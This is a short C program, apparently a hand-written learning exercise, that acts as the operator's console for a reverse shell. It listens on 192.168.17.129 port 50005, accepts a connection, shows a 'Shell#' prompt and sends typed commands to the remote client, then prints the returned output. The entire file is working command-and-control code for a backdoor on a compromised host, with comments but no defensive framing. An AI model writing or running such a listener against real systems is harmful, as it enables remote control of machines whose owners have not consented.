#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <arpa/inet.h>

int main()
{
	int sock, client_socket;
	char buffer[1024];
	char response[18384];
	struct sockaddr_in server_address, client_address;
	
	int i = 0;
	int optval = 1;
	socklen_t client_length;

	sock = socket(AF_INET, SOCK_STREAM, 0);

	// setscokopt -> Sets the socket option, in this example it is for TCP Socket.
	/* params:  
			SOCKET  s,
            int     level,
     		int     optname,
     		const 	char *optval,
    		int     optlen

			SOL_SOCKET   -> the item will be searched in the socket itself.
			SO_REUSEADDR -> Reuse the adress
	*/
	if (setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(optval)) < 0)
	{
		printf("Error setting TCP sockets!\n");
		return 1;
	}

	server_address.sin_family = AF_INET;
	server_address.sin_addr.s_addr = inet_addr("192.168.17.129");
	server_address.sin_port = htons(50005); // Port number 
	
	// binding server adress to socket. 
	bind(sock, (struct sockaddr  *) &server_address, sizeof(server_address));
	
	// Place the socket in a listening mode.
	// 5 is the maximum length of queue of the pending quetions.
	listen(sock, 5); 

	client_length = sizeof(client_address);

	// accept the data from the socket
	client_socket = accept(sock, (struct sockaddr *) &client_address, &client_length);

	// constantly receive data from client and print it on the shell.
	// else exit
	while (1)
	{
		jump:
		bzero(&buffer, sizeof(buffer));
		bzero(&response, sizeof(response));
		printf("* Shell#%s~$: ", inet_ntoa(client_address.sin_addr));
		fgets(buffer, sizeof(buffer), stdin);

		strtok(buffer, "\n");
		 write(client_socket, buffer, sizeof(buffer));

		if (strncmp("q", buffer, 1) == 0){
			break;
		}
		else {
			recv(client_socket, response, sizeof(response), MSG_WAITALL);
			printf("%s", response);
		}
	}
 }
